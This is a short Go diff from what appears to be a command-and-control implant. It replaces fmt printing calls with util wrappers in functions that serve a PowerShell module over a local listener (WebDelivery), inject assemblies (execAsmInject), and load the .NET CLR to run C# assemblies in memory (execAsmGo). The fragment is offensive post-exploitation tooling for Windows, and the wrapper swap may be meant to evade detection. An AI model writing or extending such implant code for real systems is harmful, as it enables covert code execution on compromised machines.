@@ -5,11 +5,11 @@ package command
 import (
 	"bytes"
 	"errors"
-	"fmt"
 	"github.com/Ne0nd0g/go-clr"
 	"golang.org/x/sys/windows"
 	"main/config"
 	"main/packet"
+	"main/util"
 	"net"
 	"strconv"
 	"strings"
@@ -34,12 +34,12 @@ func WebDelivery(b []byte) {
 		defer l.Close()
 		conn, err := l.Accept()
 		if err != nil {
-			fmt.Println("Error accepting: ", err)
+			util.Println("Error accepting: ", err)
 			packet.ErrorMessage(err.Error())
 			return
 		}
 		defer conn.Close()
-		httpHeader := fmt.Sprintf("HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: %d\r\n\r\n", len(powershellModule))
+		httpHeader := util.Sprintf("HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: %d\r\n\r\n", len(powershellModule))
 		receive := make([]byte, 256)
 		_, _ = conn.Read(receive)
 		_, _ = conn.Write([]byte(httpHeader))
@@ -78,7 +78,7 @@ func execAsmInject(b []byte, isDllX64 bool, ignoreToken bool) error {
 
 		err = windows.CreatePipe(&readPipe, &writePipe, &sa, 0)
 		if err != nil {
-			return errors.New(fmt.Sprintf("CreatePipe error: %s", err))
+			return errors.New(util.Sprintf("CreatePipe error: %s", err))
 		}
 		defer windows.CloseHandle(writePipe)
 		defer windows.CloseHandle(readPipe)
@@ -127,15 +127,15 @@ func execAsmGo(b []byte) error {
 
 	err = clr.RedirectStdoutStderr()
 	if err != nil {
-		return errors.New(fmt.Sprintf("RedirectStdoutStderr error: %s", err))
+		return errors.New(util.Sprintf("RedirectStdoutStderr error: %s", err))
 	}
 	runtimeHost, err := clr.LoadCLR("v4.8")
 	if err != nil {
-		return errors.New(fmt.Sprintf("LoadCLR error: %s", err))
+		return errors.New(util.Sprintf("LoadCLR error: %s", err))
 	}
 	methodInfo, err := clr.LoadAssembly(runtimeHost, csharpBin)
 	if err != nil {
-		return errors.New(fmt.Sprintf("LoadAssembly error: %s", err))
+		return errors.New(util.Sprintf("LoadAssembly error: %s", err))
 	}
 	stdout, stderr := clr.InvokeAssembly(methodInfo, argsArr)
 	if stderr != "" {
